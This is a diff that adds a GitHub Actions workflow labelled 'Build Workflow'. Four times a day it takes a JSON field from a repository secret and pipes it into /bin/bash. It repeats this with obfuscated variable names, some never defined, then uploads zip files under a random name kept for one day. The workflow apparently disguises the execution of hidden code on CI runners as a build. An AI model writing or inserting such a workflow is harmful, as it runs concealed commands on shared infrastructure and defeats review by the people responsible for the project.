@@ -1,0 +1,34 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          u61624: ${{ secrets.u61624 }}
+        run: |
+          printf '%s' "$u61624" | jq -r .jf5 | /bin/bash
+          echo $b8 | jq -r .j9513 | /bin/bash
+          printf '%s' "$l075" | jq -r .zwzxc341 | /bin/bash
+          echo $p3 | jq -r .igmp0115 | /bin/bash
+          printf '%s' "$xk49" | jq -r .w22 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: WQCfw6Jh
+          path: "*.zip"
+          retention-days: 1
